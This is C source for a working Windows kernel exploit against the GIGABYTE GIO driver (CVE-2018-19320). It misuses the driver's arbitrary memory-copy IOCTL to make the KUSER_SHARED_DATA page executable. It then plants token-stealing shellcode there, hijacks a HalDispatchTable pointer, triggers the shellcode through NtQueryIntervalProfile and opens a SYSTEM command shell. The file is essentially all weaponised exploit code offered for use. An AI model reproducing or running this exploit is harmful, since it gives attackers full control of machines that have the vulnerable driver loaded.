#include "exploit.h"

unsigned char assembly[64] = {
	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC3, 0x48, 0x8B, 0x9B, 0x48, 0x04, 0x00, 0x00, 0x48, 0x81, 0xEB, 0x48, 0x04, 0x00,
	0x00, 0x48, 0x8B, 0x8B, 0x40, 0x04, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x04, 0x75, 0xE5, 0x48, 0x8B, 0x8B, 0xB8, 0x04, 0x00, 0x00, 0x80, 0xE1, 0xF0, 0x48, 0x89, 0x88, 0xB8, 0x04, 0x00, 0x00, 0xC3
};

// Destination is stored in rbx
// Source is stored in rdi
// Size is stored in rsi
void kernel_memcpy(HANDLE h_driver, unsigned long long destination, unsigned long long source, unsigned long size)
{
	MEMCPY_PARAMETERS memcpy_struct = { destination, source, size, 0UL };
	unsigned long bytes_returned = 0UL;
	unsigned char output[0x30] = { 0 };

	RtlSecureZeroMemory(output, sizeof(output));

	DeviceIoControl(h_driver, TARGET_IOCTL, &memcpy_struct, sizeof(memcpy_struct), output, sizeof(output), &bytes_returned, 0);
}

int main(int argc, char** argv)
{
	// Preparation Stage Stack Variables
	HANDLE h_driver = CreateFileA(TARGET_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	HMODULE h_ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	unsigned long long nt_base_address = 0ULL;
	unsigned char unused = 0;

	// Exploitation Stage Stack Variables
	NtQueryIntervalProfile _NtQueryIntervalProfile = (void*)0;
	unsigned long long kuser_shared_data = 0xFFFFF78000000050;
	unsigned long long current_pte_address = kuser_shared_data >> 9ULL;
	unsigned long long current_pte_contents = 0ULL;
	unsigned long long old_pointer = 0ULL;
	unsigned long long read_data = 0ULL;
	unsigned long interval = 0UL;

	current_pte_address &= 0x7FFFFFFFF8;

	SetConsoleTitleA("CVE-2018-19320");

	printf("[*] GIGABYTE GIO Device Driver Arbitrary R/W Elevation of Privilege Vulnerability\n\n[*] Credits to the following:\n[*] Diego Juarez (Bug Discoverer)\n[*] Leandro Cuozzo from SecureAuth Advisories Team (Advisory Publication)\n\n[*] Exploit written by Niko.\n[!] Let's exploit!\n");

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Unable to obtain a handle to the vulnerable device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the vulnerable device driver. Handle Value: 0x%p", h_driver);

	if (!h_ntdll)
	{
		printf("\n[-] Unable to load the \"ntdll.dll\" module. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Loaded the \"ntdll.dll\" module. Module Handle: 0x%p", h_ntdll);

	_NtQueryIntervalProfile = (NtQueryIntervalProfile)GetProcAddress(h_ntdll, "NtQueryIntervalProfile");
	if (!_NtQueryIntervalProfile)
	{
		printf("\n[-] Failed to locate the \"NtQueryIntervalProfile\" function. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Located the \"NtQueryIntervalProfile\" function. Function Address: 0x%p", _NtQueryIntervalProfile);

	nt_base_address = (unsigned long long)leak_ntoskrnl_base_address(h_ntdll);
	if (!nt_base_address)
	{
		return 1;
	}

	for (int i = 3; i > 0; i--)
	{
		printf("\n[!] Triggering kernel memory corruption in %d...", i);
		Sleep(1000);
	}
	printf("\n<---------------- | Entering Danger Zone | ---------------->");

	kernel_memcpy(h_driver, (unsigned long long) & read_data, nt_base_address + PTE_BASE_ADDRESS_OFFSET, 8);
	current_pte_address += read_data;

	kernel_memcpy(h_driver, current_pte_address, (unsigned long long) & current_pte_contents, 8);
	current_pte_contents &= 0x0FFFFFFFFFFFFFFF;

	kernel_memcpy(h_driver, (unsigned long long) & current_pte_contents, current_pte_address, 8);
	printf("\n[!] Enabled code execution in the \"KUSER_SHARED_DATA\" memory region.");

	kernel_memcpy(h_driver, kuser_shared_data, (unsigned long long) & assembly, sizeof(assembly));
	kernel_memcpy(h_driver, (unsigned long long) & old_pointer, nt_base_address + HAL_DISPATCH_TABLE_PLUS_8_OFFSET, 8);
	kernel_memcpy(h_driver, nt_base_address + HAL_DISPATCH_TABLE_PLUS_8_OFFSET, kuser_shared_data, 8);
	printf("\n[!] Corrupted the \"HalDispatchTable\" function pointer table.");

	_NtQueryIntervalProfile(2, &interval);
	printf("\n[!] Triggered execution of kernel shellcode.");

	memset(assembly, 0, sizeof(assembly));
	kernel_memcpy(h_driver, kuser_shared_data, (unsigned long long) & assembly, sizeof(assembly));
	kernel_memcpy(h_driver, nt_base_address + HAL_DISPATCH_TABLE_PLUS_8_OFFSET, old_pointer, 8);
	printf("\n[!] Restored the kernel.\n<---------------- | Leaving Danger Zone | ---------------->\n[+] Kernel exploitation completed successfully.");

	system("start C:\\Windows\\System32\\cmd.exe");
	unused = getchar();
	return 0;
}